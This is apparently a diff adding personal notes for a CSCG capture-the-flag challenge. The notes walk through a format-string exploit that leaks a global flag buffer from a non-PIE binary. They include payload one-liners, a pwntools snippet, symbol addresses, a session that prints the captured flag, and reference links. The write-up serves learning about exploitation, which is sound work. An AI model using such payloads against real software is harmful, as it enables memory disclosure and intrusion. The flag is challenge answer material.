@@ -1,0 +1,91 @@
+0x0000000000402000  _IO_stdin_used
+0x0000000000402084  __GNU_EH_FRAME_HDR
+0x0000000000402284  __FRAME_END__
+0x0000000000403e10  __frame_dummy_init_array_entry
+0x0000000000403e10  __init_array_start
+0x0000000000403e18  __do_global_dtors_aux_fini_array_entry
+0x0000000000403e18  __init_array_end
+0x0000000000403e20  _DYNAMIC
+0x0000000000404000  _GLOBAL_OFFSET_TABLE_
+0x0000000000404088  __data_start
+0x0000000000404088  data_start
+0x0000000000404090  __dso_handle
+0x0000000000404098  __TMC_END__
+0x0000000000404098  __bss_start
+0x0000000000404098  _edata
+0x00000000004040a0  stdout
+0x00000000004040a0  stdout@@GLIBC_2.2.5
+0x00000000004040b0  stdin
+0x00000000004040b0  stdin@@GLIBC_2.2.5
+0x00000000004040c0  stderr
+0x00000000004040c0  stderr@@GLIBC_2.2.5
+0x00000000004040c8  completed
+0x00000000004040e0  flag_buffer
+0x00000000004044e0  _end
+
+
+Data: 0x404000           0x405000 rw-p     1000 3000   /home/root/ctf/cscg/pwn_2/intro-pwn-2/pwn2
+
+Offset:
+>>> hex(0x4040e0 - 0x404000)
+'0xe0'
+>>> 
+
+
+[root@cscg intro-pwn-2]$ objdump -D pwn2 | grep flag_buffer
+  401336:	48 8d 3d a3 2d 00 00 	lea    0x2da3(%rip),%rdi        # 4040e0 <flag_buffer>
+00000000004040e0 <flag_buffer>:
+[root@cscg intro-pwn-2]$ 
+
+
+Walkthrough
+- checksec to see no PIE
+- find address of public variable (.data section) (gdb, objdump)
+- format string attack
+- find out position of format string:
+	python -c 'print("A" * 8 + "%p" * 16, end="")' > payload
+	./pwn2 < payload
+- set correct address to read from (global variable flag_buffer)
+	python -c 'print("%7$s" + "\x00\x00\x00\x00" + "\xe0\x40\x40\x00\x00\x00\x00\x00", end="")' > payload
+	./pwn2 < payload
+  -> not correct because e0 is not in first UTF8 layer (ASCII), so two bytes are added
+  -> helpful to check the output file via 'hexdump payload'
+- create binary payload for example via pwntools
+	payload = b'%7$s'
+	payload += b'\x00\x00\x00\x00'
+	payload += p64(0x4040e0)
+
+
+Complications:
+- "%7$s" is of course also part of the format string and so layed down on the stack
+  -> 4 chars = 4 bytes, so fill up with 4 more bytes
+
+- python print() will add a newline sign and so also to the hex values
+  -> add print("", end="") for no newline
+
+- hex values larger than the first unicode layer are filled up with bytes if given over stdinput (ASCII (first layer): 0 - 7F)
+  -> create payload with hardcoded byte values, no chars ("hex chars" are interpreted as chars, so bytes will be added if they are not in the first layer)
+
+- Python3 can use either strings or byte values in once, combination of both is not possible
+  -> see above payload with pwntools for example if using bytes
+  -> strings can easily concatinated, see above payload with print()
+
+Flag:
+[root@cscg pwn_2]$ /bin/python /home/root/ctf/cscg/pwn_2/intro-pwn-2/pwn2.py
+[+] Opening connection to 621669b58d72895209bb90e2-intro-pwn-2.challenge.master.cscg.live on port 31337: Done
+/home/root/ctf/cscg/pwn_2/intro-pwn-2/pwn2.py:13: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  p.recvuntil("Give me some buffer: \n")
+[*] Switching to interactive mode
+You gave me: CSCG{h0pe_y0u_didnt_stuggl3_t00_h4rd_on_th1s_one}[*] Got EOF while reading in interactive
+$ 
+$ 
+[*] Closed connection to 621669b58d72895209bb90e2-intro-pwn-2.challenge.master.cscg.live port 31337
+[*] Got EOF while sending in interactive
+[root@cscg pwn_2]$ 
+
+
+Usefull links:
+https://ir0nstone.gitbook.io/notes/types/stack/format-string
+https://infosecwriteups.com/exploiting-format-string-vulnerability-97e3d588da1b
+https://www.youtube.com/watch?v=hhu7vhmuISY
+https://github.com/LiveOverflow/pwn_docker_example/blob/master/challenge/asd.py
